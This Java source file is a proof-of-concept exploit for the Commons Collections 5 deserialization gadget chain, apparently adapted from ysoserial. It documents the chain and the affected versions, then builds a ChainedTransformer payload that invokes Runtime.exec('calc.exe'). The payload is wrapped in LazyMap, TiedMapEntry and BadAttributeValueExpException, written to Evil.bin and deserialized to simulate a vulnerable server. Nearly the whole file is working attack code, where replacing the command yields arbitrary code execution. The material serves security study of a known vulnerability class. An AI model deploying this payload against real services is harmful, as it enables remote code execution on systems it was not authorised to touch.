package com.CommonsCollections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;


/**
 * 	Gadget chain:
 *  ObjectInputStream.readObject()
 *      BadAttributeValueExpException.readObject()
 *          TiedMapEntry.toString()
 *              LazyMap.get()
 *                  ChainedTransformer.transform()
 *                      ConstantTransformer.transform()
 *                      InvokerTransformer.transform()
 *                          Method.invoke()
 *                              Class.getMethod()
 *                      InvokerTransformer.transform()
 *                          Method.invoke()
 *                              Runtime.getRuntime()
 *                      InvokerTransformer.transform()
 *                          Method.invoke()
 *                              Runtime.exec()
 *
 * 	Requires:
 * 		commons-collections:3.1-3.2.1
 * 	    JDK: 1.7 & 1.8
 *
 * 	Refer：
 * 	https://github.com/woodpecker-framework/ysoserial-for-woodpecker/blob/master/src/main/java/me/gv7/woodpecker/yso/payloads/CommonsCollections5.java
 */


public class CC5 {
    public static void main(String[] args) throws Exception {
        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})});
        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap) LazyMap.decorate(innermap, chain);

        TiedMapEntry tiedmap = new TiedMapEntry(map, 123);
        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
        Field field = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        field.setAccessible(true);
        field.set(poc, tiedmap);

        //payload序列化写入文件
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("Evil.bin"));
        outputStream.writeObject(poc);
        outputStream.close();
        //服务端读取文件，反序列化，模拟网络传输
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("Evil.bin"));
        inputStream.readObject();
    }
}

